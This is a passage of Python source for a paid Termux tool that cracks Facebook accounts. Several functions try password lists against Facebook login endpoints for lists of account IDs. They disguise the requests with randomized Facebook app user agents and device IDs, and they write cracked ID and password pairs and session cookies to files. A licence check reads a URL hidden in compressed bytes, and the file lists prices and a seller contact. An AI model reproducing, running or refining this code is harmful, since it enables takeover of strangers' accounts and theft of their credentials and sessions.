...
import os,json
import os,time,zlib
print('\33[1;37\33[1m Folow me for Facebook ')
os.system('xdg-open https://www.facebook.com/profile.php?id=100094453810993')
try:
...
logo ="""
 ...
 \033[1;97m....##.....#######..##.....##.####..######. 
\033[1;97m--------------------------------------------------
\033[1;91m Author      : Walid Sabti
\033[1;91m GitHub      : https://github.com/Walidsebti
\033[1;97m Facebook    : S.walid
\033[1;97m Telegram    : https://t.me/Hamza_Ghanizada
\033[1;91m Version     : 1.0
\033[1;91m Tool Type   : Paid
\033[1;97m--------------------------------------------------"""
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [TOXIC🐺-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [TOXIC🇦🇱-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/TOXIC-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/TOXIC-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[TOXIC🇦🇱-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [TOXIC🇩🇿-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TOXIC-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TOXIC-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [TOXIC🐺-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/TOXIC-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/TOXIC-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[HAMZA-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [TOXIC-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/274.0.0.18.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/232793953;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
def api4(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [TOXIC-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				print('\r\r\033[1;91m [TOXIC🇩🇿-CP] '+ids+' | '+pas)
				open('/sdcard/TOXIC-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('\r\r\033[1;92m [TOXIC🇦🇱-OK] '+ids+' | '+pas+'\033[1;37m')
				open('/sdcard/TOXIC-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
				open('/sdcard/TOXIC-OK.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def Hamza1(ids,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TOXIC-XD🐺] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
	...
	for pas in passlist:
		try:
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if uid in str(oks):
					break
				print('\r\r\033[1;32m [TOXIC🇦🇱-OK] '+uid+' | '+pas+'\033[1;37m')
				oks.append(uid)
				open('/sdcard/TOXIC-OK.txt','a').write(uid+'|'+pas+'\n')
				break
...
def make_get_request(url):
    try:
        requests.get('https://github.com/Walidsebti/Daf3.git')
    except requests.exceptions.ConnectionError:
...
def approval():
	...
	key = "WALID-"+plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '').replace("SMPP","").replace("YT","")
	global key1
	try:
		uri = str(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcfH\xcc\xadJL\xcfH\xcc\xcb\xacJLI4233\xd2K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd670\xd4\xcfN\xad,\xa9(\xd1\xcb(\xc9\xcd\x01\x00v8\x14\x9a')).replace("b'","").replace("'","")
		...
		if key+'|'+key1 in response:
			...
			print("Note : Tool is paid We accept Easypaisa From pakistan other Country usdt Paiment Accept ")
			print(" If Your clear Data Of termux,Delete Termux,update Phone Your Key Romve I will Not Approve Again ")
			print(" If You cant Clone Dont Buy The Tool ")
			print(" First Dont Buy If you Buy the tool Your Paiment Will Not be Back ")
		print(" 15-Days Price   : 400 PKR")
		print(" 1-Month Price   : 700 PKR")
		print(" Other Countries : 5$ for Weekly  ")
		print(" Other Countries : 8$ for 15 days ")
		print(" Other Countries : 12$ For Monthly")
		input('\033[1;37m Press Enter For Contact To Admin ')
		subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+93795317603&text=Hello Hamza Sir ! Please Approve My Key The Hamza Key Is : "+ key+'|'+key1])
		time.sleep(0)
		approval()
